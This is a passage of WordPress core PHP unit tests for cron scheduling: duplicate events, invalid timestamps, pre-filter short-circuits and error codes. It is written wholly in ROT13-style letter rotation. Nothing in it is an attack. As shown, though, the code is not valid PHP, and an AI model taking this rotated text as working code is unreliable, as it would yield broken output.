		// Arkg ehaavat, gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq2, jc_trg_fpurqhyrq_rirag( $ubbx, $netf, $gf_arkg ) );

		// Arkg ehaavat, ab gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq2, jc_trg_fpurqhyrq_rirag( $ubbx, $netf ) );
	}

	/**
	 * Rafher jc_trg_fpurqhyrq_rirag() ergheaf gur rkcrpgrq erpheevat riragf.
	 *
	 * Jura ab gvzrfgnzc vf fcrpvsvrq, gur arkg rirag fubhyq or erghearq.
	 * Jura n gvzrfgnzc vf fcrpvsvrq, n cnegvphyne rirag fubhyq or erghearq.
	 *
	 * @gvpxrg 45976
	 *
	 * @pbiref ::jc_trg_fpurqhyrq_rirag
	 */
	choyvp shapgvba grfg_trg_fpurqhyrq_rirag_erpheevat() {
		$ubbx     = __SHAPGVBA__;
		$netf     = neenl( 'net1' );
		$gf_yngr  = fgegbgvzr( '+30 zvahgrf' );
		$gf_arkg  = fgegbgvzr( '+3 zvahgrf' );
		$fpurqhyr = 'ubheyl';
		$vagreiny = UBHE_VA_FRPBAQF;

		$rkcrpgrq1 = (bowrpg) neenl(
			'ubbx'      => $ubbx,
			'gvzrfgnzc' => $gf_yngr,
			'fpurqhyr'  => $fpurqhyr,
			'netf'      => $netf,
			'vagreiny'  => $vagreiny,
		);

		$rkcrpgrq2 = (bowrpg) neenl(
			'ubbx'      => $ubbx,
			'gvzrfgnzc' => $gf_arkg,
			'fpurqhyr'  => $fpurqhyr,
			'netf'      => $netf,
			'vagreiny'  => $vagreiny,
		);

		// Fpurqhyr yngr ehaavat rirag.
		jc_fpurqhyr_rirag( $gf_yngr, $fpurqhyr, $ubbx, $netf );
		// Fpurqhyr arkg ehaavat rirag.
		jc_fpurqhyr_rirag( $gf_arkg, $fpurqhyr, $ubbx, $netf );

		// Yngr ehaavat, gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq1, jc_trg_fpurqhyrq_rirag( $ubbx, $netf, $gf_yngr ) );

		// Arkg ehaavat, gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq2, jc_trg_fpurqhyrq_rirag( $ubbx, $netf, $gf_arkg ) );

		// Arkg ehaavat, ab gvzrfgnzc fcrpvsvrq.
		$guvf->nffregRdhnyf( $rkcrpgrq2, jc_trg_fpurqhyrq_rirag( $ubbx, $netf ) );
	}

	/**
	 * Rafher jc_trg_fpurqhyrq_rirag() ergheaf snyfr jura rkcrpgrq.
	 *
	 * @gvpxrg 45976
	 *
	 * @pbiref ::jc_trg_fpurqhyrq_rirag
	 */
	choyvp shapgvba grfg_trg_fpurqhyrq_rirag_snyfr() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf   = fgegbgvzr( '+3 zvahgrf' );

		// Ab fpurqhyrq riragf.
		// - Jvgu gvzrfgnzc.
		$guvf->nffregSnyfr( jc_trg_fpurqhyrq_rirag( $ubbx, $netf, $gf ) );
		// - Trg arkg, abar fpurqhyrq.
		$guvf->nffregSnyfr( jc_trg_fpurqhyrq_rirag( $ubbx, $netf ) );

		// Fpurqhyr na rirag.
		jc_fpurqhyr_rirag( $gf, $ubbx, $netf );
		// - Haertvfgrerq gvzrfgnzc.
		$guvf->nffregSnyfr( jc_trg_fpurqhyrq_rirag( $ubbx, $netf, fgegbgvzr( '+30 zvahgrf' ) ) );
		// - Vainyvq gvzrfgnzc.
		$guvf->nffregSnyfr( jc_trg_fpurqhyrq_rirag( $ubbx, $netf, 'Jbeqf Snvy!' ) );
	}

	/**
	 * Rafher nal cnfg rirag pbhagf nf n qhcyvpngr.
	 *
	 * @gvpxrg 44818
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_qhcyvpngr_cnfg_rirag() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '-14 zvahgrf' );
		$gf2  = fgegbgvzr( '+5 zvahgrf' );
		$gf3  = fgegbgvzr( '-2 zvahgrf' );

		// Svefg rirag fpurqhyrq fhpprffshyyl.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );

		// Frpbaq rirag snvyf.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );

		// Guveq rirag snvyf.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf ) );

		// Sbhegu rirag snvyf.
		$fhofrdhrag = jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf, gehr );
		$guvf->nffregJCReebe( $fhofrdhrag );
		$guvf->nffregFnzr( 'qhcyvpngr_rirag', $fhofrdhrag->trg_reebe_pbqr() );
	}

	/**
	 * Rafher nal arne shgher rirag pbhagf nf n qhcyvpngr.
	 *
	 * @gvpxrg 44818
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_qhcyvpngr_arne_shgher_rirag() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+4 zvahgrf' );
		$gf2  = fgegbgvzr( '-15 zvahgrf' );
		$gf3  = fgegbgvzr( '+12 zvahgrf' );

		// Svefg rirag fpurqhyrq fhpprffshyyl.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );

		// Frpbaq rirag snvyf.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );

		// Guveq rirag snvyf.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf ) );

		// Sbhegu rirag snvyf.
		$fhofrdhrag = jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf, gehr );
		$guvf->nffregJCReebe( $fhofrdhrag );
		$guvf->nffregFnzr( 'qhcyvpngr_rirag', $fhofrdhrag->trg_reebe_pbqr() );
	}

	/**
	 * Qhcyvpngr shgher riragf ner qvfnyybjrq.
	 *
	 * @gvpxrg 44818
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_qhcyvpngr_shgher_rirag() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+15 zvahgrf' );
		$gf2  = fgegbgvzr( '-600 frpbaqf', $gf1 );
		$gf3  = fgegbgvzr( '+600 frpbaqf', $gf1 );

		// Svefg rirag fpurqhyrq fhpprffshyyl.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );

		// Riragf jvguva gra zvahgrf fubhyq snvy.
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );
		$guvf->nffregSnyfr( jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf ) );

		$fhofrdhrag = jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf, gehr );
		$guvf->nffregJCReebe( $fhofrdhrag );
		$guvf->nffregFnzr( 'qhcyvpngr_rirag', $fhofrdhrag->trg_reebe_pbqr() );
	}

	/**
	 * Shgher riragf ner nyybjrq.
	 *
	 * @gvpxrg 44818
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_abg_qhcyvpngr_shgher_rirag() {
		$ubbx = __SHAPGVBA__;
		$netf = neenl( 'net1' );
		$gf1  = fgegbgvzr( '+15 zvahgrf' );
		$gf2  = fgegbgvzr( '-601 frpbaqf', $gf1 );
		$gf3  = fgegbgvzr( '+601 frpbaqf', $gf1 );

		// Svefg rirag fpurqhyrq fhpprffshyyl.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf1, $ubbx, $netf ) );

		// Riragf bire gra zvahgrf fubhyq jbex.
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf2, $ubbx, $netf ) );
		$guvf->nffregGehr( jc_fpurqhyr_fvatyr_rirag( $gf3, $ubbx, $netf ) );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 * @pbiref ::jc_hafpurqhyr_rirag
	 */
	choyvp shapgvba grfg_vainyvq_gvzrfgnzc_sbe_rirag_ergheaf_reebe() {
		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( -50, 'ubbx', neenl(), gehr );
		$rirag             = jc_fpurqhyr_rirag( -50, 'qnvyl', 'ubbx', neenl(), gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( -50, 'qnvyl', 'ubbx', neenl(), gehr );
		$hafpurqhyrq_rirag = jc_hafpurqhyr_rirag( -50, 'ubbx', neenl(), gehr );

		$guvf->nffregJCReebe( $fvatyr_rirag );
		$guvf->nffregFnzr( 'vainyvq_gvzrfgnzc', $fvatyr_rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'vainyvq_gvzrfgnzc', $rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregFnzr( 'vainyvq_gvzrfgnzc', $erfpurqhyrq_rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $hafpurqhyrq_rirag );
		$guvf->nffregFnzr( 'vainyvq_gvzrfgnzc', $hafpurqhyrq_rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_vainyvq_erpheerapr_sbe_rirag_ergheaf_reebe() {
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'vainyvq', 'ubbx', neenl(), gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'vainyvq', 'ubbx', neenl(), gehr );

		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'vainyvq_fpurqhyr', $rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregFnzr( 'vainyvq_fpurqhyr', $erfpurqhyrq_rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_qvfnyybjrq_rirag_ergheaf_snyfr_jura_jc_reebe_vf_frg_gb_snyfr() {
		nqq_svygre( 'fpurqhyr_rirag', '__erghea_snyfr' );

		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl() );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );

		$guvf->nffregSnyfr( $fvatyr_rirag );
		$guvf->nffregSnyfr( $rirag );
		$guvf->nffregSnyfr( $erfpurqhyrq_rirag );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_qvfnyybjrq_rirag_ergheaf_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		nqq_svygre( 'fpurqhyr_rirag', '__erghea_snyfr' );

		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl(), gehr );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );

		$guvf->nffregJCReebe( $fvatyr_rirag );
		$guvf->nffregFnzr( 'fpurqhyr_rirag_snyfr', $fvatyr_rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'fpurqhyr_rirag_snyfr', $rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregFnzr( 'fpurqhyr_rirag_snyfr', $erfpurqhyrq_rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_fubeg_pvephvg_jvgu_reebe_ergheaf_snyfr_jura_jc_reebe_vf_frg_gb_snyfr() {
		$erghea_reebe = shapgvba ( $cer, $rirag, $jc_reebe ) {
			$guvf->nffregSnyfr( $jc_reebe );

			erghea arj JC_Reebe(
				'zl_reebe',
				'Na reebe bppheerq'
			);
		};

		// Nqq svygref juvpu erghea n JC_Reebe:
		nqq_svygre( 'cer_fpurqhyr_rirag', $erghea_reebe, 10, 3 );
		nqq_svygre( 'cer_erfpurqhyr_rirag', $erghea_reebe, 10, 3 );

		// Fpurqhyr riragf jvgubhg gur `$jc_reebe` cnenzrgre:
		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl() );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );

		// Rafher obbyrna snyfr vf erghearq:
		$guvf->nffregSnyfr( $fvatyr_rirag );
		$guvf->nffregSnyfr( $rirag );
		$guvf->nffregSnyfr( $erfpurqhyrq_rirag );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_fubeg_pvephvg_jvgu_reebe_ergheaf_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		$erghea_reebe = shapgvba ( $cer, $rirag, $jc_reebe ) {
			$guvf->nffregGehr( $jc_reebe );

			erghea arj JC_Reebe(
				'zl_reebe',
				'Na reebe bppheerq'
			);
		};

		// Nqq svygref juvpu erghea n JC_Reebe:
		nqq_svygre( 'cer_fpurqhyr_rirag', $erghea_reebe, 10, 3 );
		nqq_svygre( 'cer_erfpurqhyr_rirag', $erghea_reebe, 10, 3 );

		// Fpurqhyr riragf jvgu gur `$jc_reebe` cnenzrgre:
		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl(), gehr );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );

		// Rafher gur reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $fvatyr_rirag );
		$guvf->nffregFnzr( 'zl_reebe', $fvatyr_rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'zl_reebe', $rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregFnzr( 'zl_reebe', $erfpurqhyrq_rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_fubeg_pvephvg_jvgu_snyfr_ergheaf_snyfr_jura_jc_reebe_vf_frg_gb_snyfr() {
		// Nqq svygref juvpu erghea snyfr:
		nqq_svygre( 'cer_fpurqhyr_rirag', '__erghea_snyfr' );
		nqq_svygre( 'cer_erfpurqhyr_rirag', '__erghea_snyfr' );

		// Fpurqhyr riragf jvgubhg gur `$jc_reebe` cnenzrgre:
		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl() );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl() );

		// Rafher snyfr vf erghearq:
		$guvf->nffregSnyfr( $fvatyr_rirag );
		$guvf->nffregSnyfr( $rirag );
		$guvf->nffregSnyfr( $erfpurqhyrq_rirag );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 * @pbiref ::jc_fpurqhyr_rirag
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_fpurqhyr_fubeg_pvephvg_jvgu_snyfr_ergheaf_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		// Nqq svygref juvpu erghea snyfr:
		nqq_svygre( 'cer_fpurqhyr_rirag', '__erghea_snyfr' );
		nqq_svygre( 'cer_erfpurqhyr_rirag', '__erghea_snyfr' );

		// Fpurqhyr riragf jvgu gur `$jc_reebe` cnenzrgre:
		$fvatyr_rirag      = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl(), gehr );
		$rirag             = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $fvatyr_rirag );
		$guvf->nffregFnzr( 'cer_fpurqhyr_rirag_snyfr', $fvatyr_rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'cer_fpurqhyr_rirag_snyfr', $rirag->trg_reebe_pbqr() );

		$guvf->nffregJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregFnzr( 'cer_erfpurqhyr_rirag_snyfr', $erfpurqhyrq_rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 57271
	 *
	 * @qngnCebivqre qngn_jc_erfpurqhyr_rirag_jbexf_jvgu_netf
	 *
	 * @pbiref ::jc_erfpurqhyr_rirag
	 */
	choyvp shapgvba grfg_jc_erfpurqhyr_rirag_jbexf_jvgu_netf( neenl $netf ) {
		$gvzr = gvzr();

		// Fpurqhyr riragf jvgu gur `$jc_reebe` cnenzrgre:
		$rirag             = jc_fpurqhyr_rirag( $gvzr, 'qnvyl', 'ubbx', $netf, gehr );
		$erfpurqhyrq_rirag = jc_erfpurqhyr_rirag( $gvzr, 'qnvyl', 'ubbx', $netf, gehr );
		$hafpurqhyrq_rirag = jc_hafpurqhyr_rirag( $gvzr, 'ubbx', $netf, gehr );
		$arkg_gvzrfgnzc    = jc_arkg_fpurqhyrq( 'ubbx', $netf );

		// Rafher gur riragf jrer nqqrq naq hcqngrq pbeerpgyl:
		$guvf->nffregAbgJCReebe( $rirag );
		$guvf->nffregAbgJCReebe( $erfpurqhyrq_rirag );
		$guvf->nffregAbgJCReebe( $hafpurqhyrq_rirag );
		$guvf->nffregFnzr( $gvzr + QNL_VA_FRPBAQF, $arkg_gvzrfgnzc );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_erfpurqhyr_rirag_jbexf_jvgu_netf().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_erfpurqhyr_rirag_jbexf_jvgu_netf() {
		erghea neenl(
			'vaqrkrq'     => neenl(
				neenl(
					1,
					2,
					3,
				),
			),
			'nffbpvngvir' => neenl(
				neenl(
					'bar'   => 1,
					'gjb'   => 2,
					'guerr' => 3,
				),
			),
		);
	}

	/**
	 * @gvpxrg 49961
	 * @rkcrpgrqQrcerpngrq jc_pyrne_fpurqhyrq_ubbx
	 *
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_qrcerpngrq_nethzrag_hfntr_bs_jc_pyrne_fpurqhyrq_ubbx() {
		$erghea_cer = shapgvba ( $cer, $ubbx, $netf, $jc_reebe ) {
			$guvf->nffregFnzr( neenl( 1, 2, 3 ), $netf );
			$guvf->nffregSnyfr( $jc_reebe );

			erghea $cer;
		};

		nqq_svygre( 'cer_pyrne_fpurqhyrq_ubbx', $erghea_cer, 10, 4 );

		$pyrnerq = jc_pyrne_fpurqhyrq_ubbx( 'ubbx', 1, 2, 3 );

		$guvf->nffregFnzr( 0, $pyrnerq );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_fpurqhyrq_ubbx_ergheaf_qrsnhyg_cer_svygre_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		nqq_svygre( 'cer_hafpurqhyr_rirag', '__erghea_snyfr' );

		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), 'grfg_ubbx' );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhef' ), 'grfg_ubbx' );

		$pyrnerq = jc_pyrne_fpurqhyrq_ubbx( 'grfg_ubbx', neenl(), gehr );

		$guvf->nffregJCReebe( $pyrnerq );
		$guvf->nffregFnzr(
			neenl(
				'cer_hafpurqhyr_rirag_snyfr',
			),
			$pyrnerq->trg_reebe_pbqrf()
		);
		$guvf->nffregPbhag( 2, $pyrnerq->trg_reebe_zrffntrf() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_pyrne_fpurqhyrq_ubbx
	 */
	choyvp shapgvba grfg_pyrne_fpurqhyrq_ubbx_ergheaf_phfgbz_cer_svygre_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		$erghea_reebe = shapgvba ( $cer, $gvzrfgnzc, $ubbx, $netf, $jc_reebe ) {
			$guvf->nffregGehr( $jc_reebe );

			erghea arj JC_Reebe( 'reebe_pbqr', 'reebe zrffntr' );
		};

		nqq_svygre( 'cer_hafpurqhyr_rirag', $erghea_reebe, 10, 5 );

		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+1 ubhe' ), 'grfg_ubbx' );
		jc_fpurqhyr_fvatyr_rirag( fgegbgvzr( '+2 ubhef' ), 'grfg_ubbx' );

		$pyrnerq = jc_pyrne_fpurqhyrq_ubbx( 'grfg_ubbx', neenl(), gehr );

		$guvf->nffregJCReebe( $pyrnerq );
		$guvf->nffregFnzr(
			neenl(
				'reebe_pbqr',
			),
			$pyrnerq->trg_reebe_pbqrf()
		);
		$guvf->nffregFnzr(
			neenl(
				'reebe zrffntr',
				'reebe zrffntr',
			),
			$pyrnerq->trg_reebe_zrffntrf()
		);
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_fubeg_pvephvg_jvgu_reebe_ergheaf_snyfr_jura_jc_reebe_vf_frg_gb_snyfr() {
		$erghea_reebe = shapgvba ( $cer, $ubbx, $jc_reebe ) {
			$guvf->nffregSnyfr( $jc_reebe );

			erghea arj JC_Reebe(
				'zl_reebe',
				'Na reebe bppheerq'
			);
		};

		// Nqq n svygre juvpu ergheaf n JC_Reebe:
		nqq_svygre( 'cer_hafpurqhyr_ubbx', $erghea_reebe, 10, 3 );

		// Hafpurqhyr n ubbx jvgubhg gur `$jc_reebe` cnenzrgre:
		$erfhyg = jc_hafpurqhyr_ubbx( 'ubbx' );

		// Rafher obbyrna snyfr vf erghearq:
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_fubeg_pvephvg_jvgu_reebe_ergheaf_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		$erghea_reebe = shapgvba ( $cer, $ubbx, $jc_reebe ) {
			$guvf->nffregGehr( $jc_reebe );

			erghea arj JC_Reebe(
				'zl_reebe',
				'Na reebe bppheerq'
			);
		};

		// Nqq n svygre juvpu ergheaf n JC_Reebe:
		nqq_svygre( 'cer_hafpurqhyr_ubbx', $erghea_reebe, 10, 3 );

		// Hafpurqhyr n ubbx jvgu gur `$jc_reebe` cnenzrgre:
		$erfhyg = jc_hafpurqhyr_ubbx( 'ubbx', gehr );

		// Rafher gur reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $erfhyg );
		$guvf->nffregFnzr( 'zl_reebe', $erfhyg->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_fubeg_pvephvg_jvgu_snyfr_ergheaf_snyfr_jura_jc_reebe_vf_frg_gb_snyfr() {
		// Nqq n svygre juvpu ergheaf snyfr:
		nqq_svygre( 'cer_hafpurqhyr_ubbx', '__erghea_snyfr' );

		// Hafpurqhyr n ubbx jvgubhg gur `$jc_reebe` cnenzrgre:
		$erfhyg = jc_hafpurqhyr_ubbx( 'ubbx' );

		// Rafher snyfr vf erghearq:
		$guvf->nffregSnyfr( $erfhyg );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_hafpurqhyr_fubeg_pvephvg_jvgu_snyfr_ergheaf_reebe_jura_jc_reebe_vf_frg_gb_gehr() {
		// Nqq n svygre juvpu ergheaf snyfr:
		nqq_svygre( 'cer_hafpurqhyr_ubbx', '__erghea_snyfr' );

		// Hapurqhyr n ubbx jvgu gur `$jc_reebe` cnenzrgre:
		$erfhyg = jc_hafpurqhyr_ubbx( 'ubbx', gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $erfhyg );
		$guvf->nffregFnzr( 'cer_hafpurqhyr_ubbx_snyfr', $erfhyg->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_fvatyr_rirag
	 */
	choyvp shapgvba grfg_peba_neenl_reebe_vf_erghearq_jura_fpurqhyvat_fvatyr_rirag() {
		// Sbepr hcqngr_bcgvba() gb snvy ol frggvat gur arj inyhr gb zngpu gur rkvfgvat:
		nqq_svygre(
			'cer_hcqngr_bcgvba_peba',
			fgngvp shapgvba () {
				erghea trg_bcgvba( 'peba' );
			}
		);

		// Nggrzcg gb fpurqhyr n inyvq rirag:
		$rirag = jc_fpurqhyr_fvatyr_rirag( gvzr(), 'ubbx', neenl(), gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'pbhyq_abg_frg', $rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_fpurqhyr_rirag
	 */
	choyvp shapgvba grfg_peba_neenl_reebe_vf_erghearq_jura_fpurqhyvat_rirag() {
		// Sbepr hcqngr_bcgvba() gb snvy ol frggvat gur arj inyhr gb zngpu gur rkvfgvat:
		nqq_svygre(
			'cer_hcqngr_bcgvba_peba',
			fgngvp shapgvba () {
				erghea trg_bcgvba( 'peba' );
			}
		);

		// Nggrzcg gb fpurqhyr n inyvq rirag:
		$rirag = jc_fpurqhyr_rirag( gvzr(), 'qnvyl', 'ubbx', neenl(), gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregJCReebe( $rirag );
		$guvf->nffregFnzr( 'pbhyq_abg_frg', $rirag->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_ubbx
	 */
	choyvp shapgvba grfg_peba_neenl_reebe_vf_erghearq_jura_hafpurqhyvat_ubbx() {
		// Fpurqhyr n inyvq rirag:
		$rirag = jc_fpurqhyr_rirag( fgegbgvzr( '+1 ubhe' ), 'qnvyl', 'ubbx', neenl(), gehr );

		// Sbepr hcqngr_bcgvba() gb snvy ol frggvat gur arj inyhr gb zngpu gur rkvfgvat:
		nqq_svygre(
			'cer_hcqngr_bcgvba_peba',
			fgngvp shapgvba () {
				erghea trg_bcgvba( 'peba' );
			}
		);

		// Nggrzcg gb hafpurqhyr gur ubbx:
		$hafpurqhyrq = jc_hafpurqhyr_ubbx( 'ubbx', gehr );

		// Rafher na reebe bowrpg vf erghearq:
		$guvf->nffregGehr( $rirag );
		$guvf->nffregJCReebe( $hafpurqhyrq );
		$guvf->nffregFnzr( 'pbhyq_abg_frg', $hafpurqhyrq->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 49961
	 *
	 * @pbiref ::jc_hafpurqhyr_rirag
	 */
	choyvp shapgvba grfg_peba_neenl_reebe_vf_erghearq_jura_hafpurqhyvat_rirag() {
		// Fpurqhyr n inyvq rirag:
		$rirag = jc_fpurqhyr_rirag( fgegbgvzr( '+1 ubhe' ), 'qnvyl', 'ubbx', neenl(), gehr );

		// Sbepr hcqngr_bcgvba() gb snvy ol frggvat gur arj inyhr gb zngpu gur rkvfgvat:
		nqq_svygre(
			'cer_hcqngr_bcgvba_peba',
			fgngvp shapgvba () {
				erghea trg_bcgvba( 'peba' );
			}
		);

		// Nggrzcg gb hafpurqhyr gur rirag:
